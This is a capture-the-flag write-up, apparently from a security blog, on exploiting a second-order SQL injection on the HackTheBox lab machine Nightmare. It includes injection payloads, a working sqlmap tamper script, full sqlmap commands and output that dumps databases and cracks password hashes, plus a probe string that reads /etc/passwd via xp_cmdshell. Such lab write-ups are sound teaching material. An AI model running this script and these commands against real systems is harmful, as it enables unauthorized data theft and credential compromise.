# Second Order SQL-Injection on HTB Nightmare

[hackthebox](/tags#hackthebox ) [htb-nightmare](/tags#htb-nightmare )
[ctf](/tags#ctf ) [sqli](/tags#sqli ) [sqlmap](/tags#sqlmap )
[tamper](/tags#tamper ) [second-order-sqli](/tags#second-order-sqli ) [second-
order](/tags#second-order )  
  
Jul 7, 2018

Second Order SQL-Injection on HTB Nightmare

Nightmare just retired, and it was a insanely difficult box. Rather than do a
full walkthrough, I wanted to focus on a write-up of the second-order SQL
injection necessary as a first step for this host.

## Second Order SQL Injection

In a typical SQL Injection, user input is used to build a query in an unsafe
way. Typically, the result is observed immediately. But in a second order SQL
Injection, user input is stored by the application, and then later used in an
unsafe way. That is the case here, where input at `register.php` will be
stored in the database. Later, when a post is made to login, that will be
pulled and validated, and then on redirection, the username is used to query
the database to get the notes associated with that user. However, if we create
a user with the right user name, we can corrupt this query so that additional
data is displayed.

## POC

Before using `sqlmap` to go after this vulnerability on Nightmare, we want to
get a feel for what is possible. At the registration page, we’ll create a user
`a' --`, and when we log in, we notice the message “SQL ERROR”.

![1530648999901](https://0xdfimages.gitlab.io/img/1530648999901.png)

That’s in the area where notes are displayed, so it seems like there is a
query to the database to get notes associated with our user, and the input
isn’t filtered.

Even cooler, when we set the username to `a') -- -`, we get the error to go
away:

![1530649129229](https://0xdfimages.gitlab.io/img/1530649129229.png)

This is an example of a second order sqli.

## Nightmare SQLi with sqlmap

### Getting It to Work

A standard SQLi attack with `sqlmap` (even at most aggressive) is going to
fail, as the injection happens at the registration, but then isn’t visible
until later at the notes home page.

To do this successfully with `sqlmap`, we’ll need to do the following steps:

  1. Create an account with username being the injectable item 
     * via tamper script
  2. Login with that account 
     * `sqlmap` main functionality
  3. Visit `/notes.php` to look for results 
     * `--second-order` flag to tell `sqlmap` to visit `/notes.php` to look for output
     * alternatively, we could leave this off and allow `sqlmap` to follow the redirect it gets back from logging in

#### Tamper Script - nightmare-tamper.py

I used two references to build my tamper script ([sans blog post](https://pen-
testing.sans.org/blog/2017/10/13/sqlmap-tamper-scripts-for-the-win) and
[pentest blog post](https://pentest.blog/exploiting-second-order-sqli-flaws-
by-using-burp-custom-sqlmap-tamper/)), and of course learned from
[ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA).

Key points for the script. The `tamper` function will be called before each
query that `sqlmap` makes to the target. `tamper` is passed the payload that
will be used, and it returns that payload for use. We also have the
opportunity to set other things, like cookies.

This script call `create_account`, which will register an account on the
Nightmare page, and get back a “PHPSESSID” cookie that we will return so that
it’s used with the rest additional two requests that will be associated with
the session.

We’ll want to use the same password here at registration that we use in the
next step for login.

Here’s `nightmare-tamper.py`:

    
    
    #!/usr/bin/env python
    
    import re
    import requests
    from lib.core.enums import PRIORITY
    __priority__ = PRIORITY.NORMAL
    
    def dependencies():
        pass
    
    def create_account(payload):
        s = requests.Session()
    
        # register with username = payload
        # user=a%27%29+--+-&pass=df&register=Register
        post_data = { 'user':payload, 'pass':'df', 'register':'Register' }
        proxies = { 'http':'http://127.0.0.1:8080' }
        response = s.post("http://10.10.10.66/register.php", data=post_data, proxies=proxies)
        # get cookie
        #Set-Cookie: PHPSESSID=l5vdi7j5gq6g978bor44fndt80; path=/
        php_cookie = re.search('PHPSESSID=(.*?);', response.headers['Set-Cookie']).group(1)
    
        return "PHPSESSID={0}".format(php_cookie)
    
    def tamper(payload, **kwargs):
        headers = kwargs.get("headers", {})
        headers["Cookie"] = create_account(payload)
        return payload
    

#### sqlmap Command Line

We’ll accomplish steps 2) and 3) with options at the `sqlpmap` command line:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0.1:8080
    

Options:

  * `--technique=U` \- `sqlmap` will try six different classes of sqli attack: [B]oolean-based, [E]rror-based, [U]nion-based, [S]tacked queries, [T]imebased queries, and Inline [Q]ueries. By default, it’s `BEUSTQ`, but since we already showed in the manual work that we’ll be using a union attack, we’ll reduce the number of checks

  * `-r login.request` \- a request saved out of burp, making sure there’s no PHPSESSID cookie, and that the password is the same as our tamper script:
    
        POST /index.php HTTP/1.1
    Host: 10.10.10.66
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.66/index.php
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 37
    Connection: close
    Upgrade-Insecure-Requests: 1
    
    user=aaaabcddddd&pass=df&login=Login
    

  * `--dbms mysql` \- given this is a linux host, and mysql is common with the linux / php stack, we’ll guess this to speed things up. If `sqlmap` disagrees, it will tell us.

  * `--tamper tamper-nightmare.py` \- our tamper script from above

  * `--second-order 'http://10.10.10.66/notes.php'` \- after the request to `index.php` to login, visit this url to check for results

  * `-p user` \- we know from the manual work that the injectable parameter is the username

  * `--proxy http://127.0.0.1:8080` \- send requests through Burp for analysis. Would probably remove this prior to a big dump of the database to speed things up

## Details of Initial Run

We start `sqlmap` with the commands above, and it runs until the following
prompt:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0.1:8080
            ___
           __H__
     ___ ___[)]_____ ___ ___  {1.2.6#stable}
    |_ -| . ["]     | .'| . |
    |___|_  [,]_|_|_|__,|  _|
          |_|V          |_|   http://sqlmap.org
    
    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
    
    [*] starting at 21:05:01
    
    [21:05:01] [INFO] parsing HTTP request from 'login.request'
    [21:05:01] [INFO] loading tamper module 'tamper-nightmare'
    [21:05:02] [INFO] testing connection to the target URL
    sqlmap got a 302 redirect to 'http://10.10.10.66/index.php'. Do you want to follow? [Y/n]
    

Up to this point, we can see in burp that two queries have been sent - a POST
to `/index.php` to login, which returns a ‘Wrong username or password’ message
because the user doesn’t exist, followed by a GET request to `/notes.php`,
which returned a 302 redirect to `/index.php` because there’s no active
session. But even if we had successfully logged in, we don’t need to follow
that redirect, as we’ll be making the second-order visit to `/notes.php` for
each query. So we’ll select `n`.

The script continues:

    
    
    [21:07:17] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
    

The WAF/IPS/IDS check consists of a funky POST to `index.php`:

    
    
    POST /index.php?Gbya=8703%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1
    Content-Length: 38
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Host: 10.10.10.66
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
    Connection: close
    Cookie: PHPSESSID=shhaht5gkik3dtiq6ijf9bpe26
    Referer: http://10.10.10.66/index.php
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    
    user=aaaaaabcddddd&pass=df&login=Login
    

This gets another ‘Wrong username or password’, and it’s immediately followed
by a second order request to `/notes.php`, which gets 302ed to `/index.php`.

As `sqlmap` moves into it’s next phase, this time it starts with the tamper
script, so we see a POST to `/register.php` with data
`register=Register&user=aaaaaabcddddd.%27.%22%29%28%2C..%28&pass=df`. The
response is a message that the user has been created.

Then the script prompts:

    
    
    you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n]
    

Queries are going to be a series of 1) POST to `/register.php`, 2) POST to
`/index.php`, 3) GET to `/notes.php`. If we say `Y` here, we’ll try to set a
cookie at 1), but then the server will set a new cookie at 2), and that will
overwrite the first one. If we say `n`, then the cookie set in 1) will carry
though all three requests. Either is actually fine, as long as we’ve got the
username and password the same in 1) and 2). We’ll say `n`. Our tamper script
is setting a cookie. But the login page may also set a cookie. We don’t want
to merge. We want ours to be the only PHPSESSID, so we’ll say no.

`ssqlmap` continues to make 25 queries (each with 3 requests) to the site:

    
    
    [05:19:17] [INFO] heuristic (basic) test shows that POST parameter 'user' might be injectable
    [05:19:18] [INFO] testing for SQL injection on POST parameter 'user'
    [05:19:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
    [05:19:21] [WARNING] reflective value(s) found and filtering out
    [05:19:32] [INFO] target URL appears to be UNION injectable with 2 columns
    [05:19:33] [INFO] POST parameter 'user' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
    [05:19:33] [INFO] checking if the injection point on POST parameter 'user' is a false positive
    POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
    

Having found user vulnerable, and having no others to check, we’ll say `N`. We
get the following summary:

    
    
    POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
    sqlmap identified the following injection point(s) with a total of 21 HTTP(s) requests:
    ---
    Parameter: user (POST)
        Type: UNION query
        Title: Generic UNION query (NULL) - 2 columns
        Payload: user=aaaaaaaaabcddddd') UNION ALL SELECT CONCAT(0x716a627a71,0x786d534f4d5846644173476c53616972434878705241514d437059444743677872664f6257515a57,0x716a767071),NULL-- NdDm&pass=df&login=Login
    ---
    [05:23:48] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
    

It’s interesting that it calls this 21 requests, when we saw somewhere between
75 and 79, depending on if you count the four at start.

Then it continues to test the database version. It does this with another 3
sets of three queries, and confirms it’s `mysql`:

    
    
    [05:23:48] [INFO] testing MySQL
    [05:23:50] [INFO] confirming MySQL
    [05:23:54] [INFO] the back-end DBMS is MySQL
    web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
    web application technology: Apache 2.4.18
    back-end DBMS: MySQL >= 5.0.0
    [05:23:54] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.10.66'
    
    [*] shutting down at 05:23:54
    

### Database Enumeration

With a working injection, we can now do further enumeration.

Adding `--dbs` will show the database names:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0
    .1:8080 --dbs
    ...
    [05:38:02] [INFO] fetching database names
    [05:38:03] [INFO] used SQL query returns 3 entries
    [05:38:05] [INFO] retrieved: information_schema
    [05:38:06] [INFO] retrieved: notes
    [05:38:07] [INFO] retrieved: sysadmin
    available databases [3]:
    [*] information_schema
    [*] notes
    [*] sysadmin
    

Adding `--tables` will show the tables. This query fails initially, but with a
suggestion:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0
    .1:8080 --dbs --tables
    ...
    [06:35:26] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
    [06:35:26] [ERROR] unable to retrieve the table names for any database
    

Adding `--no-cast` will enable table enumeration:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0
    .1:8080 --dbs --tables --no-cast
    ...
    [06:36:59] [INFO] fetching tables for databases: 'information_schema, notes, sysadmin'
    [06:36:59] [INFO] used SQL query returns 65 entries
    Database: sysadmin
    [2 tables]
    +---------------------------------------+
    | configs                               |
    | users                                 |
    +---------------------------------------+
    
    Database: notes
    [2 tables]
    +---------------------------------------+
    | notes                                 |
    | users                                 |
    +---------------------------------------+
    
    
    Database: information_schema
    [61 tables]
    +---------------------------------------+
    | CHARACTER_SETS                        |
    | COLLATIONS                            |
    | COLLATION_CHARACTER_SET_APPLICABILITY |
    | COLUMNS                               |
    ...
    | VIEWS                                 |
    +---------------------------------------+
    

### Dumping Data

The `--dump` flag will give the entries from a database. By default, that’s
the current database in use by the application. There’s also a `--dump-all`
which will dump all databases, and a `--exclude-sysdbs`.

But in this case, we want to be a bit more granular. We probably don’t want
the `information_schema` database. And we want to be really careful with the
`notes` database, as we’ve created a bunch of users in it with each
registration.

So let’s start with the `sysadmin` database:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0.1:8080 --dump -D sys
    admin --no-cast
    ...
    Database: sysadmin
    Table: configs
    [13 entries]
    +------------+----------+
    | ip         | server   |
    +------------+----------+
    | 10.0.21.11 | server2  |
    | 10.0.21.12 | server3  |
    | 10.0.21.13 | server4  |
    | 10.0.21.14 | server5  |
    | 10.0.21.15 | server6  |
    | 10.0.21.16 | server7  |
    | 10.0.21.17 | server8  |
    | 10.0.21.18 | server9  |
    | 10.0.21.19 | server10 |
    | 10.0.21.20 | server11 |
    | 10.0.21.21 | server12 |
    | 10.0.21.22 | server13 |
    | 10.0.21.23 | server14 |
    +------------+----------+
    ...
    Database: sysadmin
    Table: users
    [11 entries]
    +--------------+-------------------+
    | username     | password          |
    +--------------+-------------------+
    | admin        | nimda             |
    | cisco        | cisco123          |
    | adminstrator | Pyuhs738?183*hjO! |
    | josh         | tontochilegge     |
    | system       | manager           |
    | root         | HasdruBal78       |
    | decoder      | HackerNumberOne!  |
    | ftpuser      | @whereyougo?      |
    | sys          | change_on_install |
    | superuser    | passw0rd          |
    | user         | odiolafeta        |
    +--------------+-------------------+
    ...
    

That’s enough information to move on in the case of nightmare, but if we
wanted to look at the notes table, we could do it with a bit more precision.

First, we can dump the `notes` table (from the `notes` database):

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0.1:8080 --dump -D notes -T notes --no-cast
    ...
    [06:50:27] [INFO] fetching columns for table 'notes' in database 'notes'
    [06:50:28] [WARNING] reflective value(s) found and filtering out
    [06:50:28] [INFO] used SQL query returns 4 entries
    [06:50:28] [INFO] retrieved: "id","int(4) unsigned"
    [06:50:29] [INFO] retrieved: "user","int(4) unsigned"
    [06:50:30] [INFO] retrieved: "title","varchar(255)"
    [06:50:30] [INFO] retrieved: "text","text"
    [06:50:30] [INFO] fetching entries for table 'notes' in database 'notes'
    [06:50:31] [INFO] used SQL query returns 1 entries
    Database: notes
    Table: notes
    [1 entry]
    +----+------------------------+-----------------------------------------------------------------+--------+
    | id | text                   | title                                                           | user   |
    +----+------------------------+-----------------------------------------------------------------+--------+
    | 1  | What a wonderful note! | This is my first note No one else than me (admin) should see it | 1      |
    +----+------------------------+-----------------------------------------------------------------+--------+
    ...
    

Next, we’ll look at the users table, and we’ll try to defeat username that
start with ‘aaaaa’ from our search, since we added those, with the `--where`
flag:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0.1:8080 --dump -D notes -T users --where "username NOT LIKE 'aaaaa%'" --no-cast
    

Next, we’ll look at the users table, and we’ll try to defeat username that
start with ‘aaaaa’ from our search, since we added those, with the `--where`
flag:

    
    
    root@kali# sqlmap --technique=U -r login.request --dbms mysql --tamper tamper-nightmare.py --second-order 'http://10.10.10.66/notes.php' -p user --proxy http://127.0.0.1:8080 --dump -D notes -T users --where "username NOT LIKE 'aaaaa%'" --no-cast
    ...
    [06:54:50] [INFO] fetching columns for table 'users' in database 'notes'
    [06:54:50] [INFO] used SQL query returns 3 entries
    [06:54:50] [INFO] resumed: "id","int(4) unsigned"
    [06:54:50] [INFO] resumed: "username","varchar(255)"
    [06:54:50] [INFO] resumed: "password","varchar(32)"
    [06:54:50] [INFO] fetching entries for table 'users' in database 'notes'
    [06:54:51] [WARNING] reflective value(s) found and filtering out
    [06:54:51] [INFO] used SQL query returns 2 entries
    [06:54:52] [INFO] retrieved: "1","ee10c315eba2c75b403ea99136f5b48d","admin"
    [06:54:53] [INFO] retrieved: "67","c11200b1c60d38eded1effbca7653675","delfy"
    [06:54:53] [INFO] recognized possible password hashes in column 'password'
    do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
    do you want to crack them via a dictionary-based attack? [Y/n/q] y
    [06:55:02] [INFO] using hash method 'md5_generic_passwd'
    what dictionary do you want to use?
    [1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
    [2] custom dictionary file
    [3] file with list of dictionary files
    > 1
    [06:55:07] [INFO] using default dictionary
    do you want to use common password suffixes? (slow!) [y/N]
    [06:55:09] [INFO] starting dictionary-based cracking (md5_generic_passwd)
    [06:55:09] [INFO] starting 4 processes
    [06:55:12] [INFO] cracked password 'nofear' for user 'delfy'
    [06:55:12] [INFO] cracked password 'nimda' for user 'admin'
    Database: notes
    Table: users
    [2 entries]
    +----+----------+-------------------------------------------+
    | id | username | password                                  |
    +----+----------+-------------------------------------------+
    | 1  | admin    | ee10c315eba2c75b403ea99136f5b48d (nimda)  |
    | 67 | delfy    | c11200b1c60d38eded1effbca7653675 (nofear) |
    +----+----------+-------------------------------------------+
    

And, after letting `sqlmap` crack the hashes, we can log in as admin and
delfy:

![1530701860559](https://0xdfimages.gitlab.io/img/1530701860559.png)
![1530701903143](https://0xdfimages.gitlab.io/img/1530701903143.png)

## Conclusion

Second Order SQL Injection is tricky, and there’s almost never going to be a
tool that just does it for you. But, if you can write a python script, you can
make `sqlpmap` do what you’re looking for and get the data from the database.

[](/2018/07/07/second-order-sql-injection-on-htb-nightmare.html)

